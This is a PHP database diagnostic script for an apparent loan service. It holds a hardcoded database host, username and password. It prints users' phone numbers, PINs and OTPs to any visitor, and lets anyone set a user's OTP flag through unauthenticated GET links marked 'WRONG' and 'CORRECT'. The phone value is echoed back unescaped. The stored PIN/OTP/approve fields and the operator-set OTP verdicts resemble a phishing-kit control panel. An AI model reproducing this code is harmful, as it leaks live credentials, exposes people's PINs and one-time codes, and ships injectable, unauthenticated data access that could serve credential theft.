<?php
session_start();

$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";

$conn = pg_connect("host=$dbHost port=$dbPort dbname=$dbName user=$dbUser password=$dbPass");
if(!$conn) die("DB connection failed");

echo "<h2>Database Diagnostic</h2>";

// Check what columns exist in users table
$result = pg_query($conn, "SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' ORDER BY ordinal_position");
if($result) {
    echo "<h3>Columns in 'users' table:</h3>";
    echo "<ul>";
    while($row = pg_fetch_assoc($result)) {
        echo "<li><strong>" . $row['column_name'] . "</strong> (" . $row['data_type'] . ")</li>";
    }
    echo "</ul>";
} else {
    echo "Error getting columns: " . pg_last_error($conn);
}

// Check sample data
echo "<h3>Sample data (first 5 users):</h3>";
$result = pg_query($conn, "SELECT phone, pin, otp, approve, logout FROM users LIMIT 5");
if($result && pg_num_rows($result) > 0) {
    echo "<table border='1' cellpadding='5'>";
    echo "<tr><th>Phone</th><th>pin</th><th>otp</th><th>approve</th><th>logout</th></tr>";
    while($row = pg_fetch_assoc($result)) {
        echo "<tr>";
        echo "<td>" . $row['phone'] . "</td>";
        echo "<td>" . ($row['pin'] ?? 'NULL') . "</td>";
        echo "<td>" . ($row['otp'] ?? 'NULL') . "</td>";
        echo "<td>" . ($row['approve'] ?? 'NULL') . "</td>";
        echo "<td>" . ($row['logout'] ?? 'NULL') . "</td>";
        echo "</tr>";
    }
    echo "</table>";
} else {
    echo "No users found or error: " . pg_last_error($conn);
}

// Test update on a specific phone (replace with actual phone from your session)
if(isset($_GET['test_phone'])) {
    $testPhone = $_GET['test_phone'];
    $testValue = isset($_GET['test_value']) ? (int)$_GET['test_value'] : 1;
    
    $update = pg_query_params($conn, "UPDATE users SET otp = $1 WHERE phone = $2", [$testValue, $testPhone]);
    if($update) {
        echo "<p style='color:green'>✓ Updated OTP for $testPhone to $testValue</p>";
        
        // Verify the update
        $check = pg_query_params($conn, "SELECT otp FROM users WHERE phone = $1", [$testPhone]);
        if($check && $row = pg_fetch_assoc($check)) {
            echo "<p>Verified: OTP is now " . $row['otp'] . "</p>";
        }
    } else {
        echo "<p style='color:red'>✗ Update failed: " . pg_last_error($conn) . "</p>";
    }
}

echo "<h3>Test Links (replace PHONE_NUMBER with actual phone):</h3>";
echo "<p>Set OTP to 1 (WRONG): <a href='?test_phone=PHONE_NUMBER&test_value=1'>Click here</a></p>";
echo "<p>Set OTP to 2 (CORRECT): <a href='?test_phone=PHONE_NUMBER&test_value=2'>Click here</a></p>";
?>
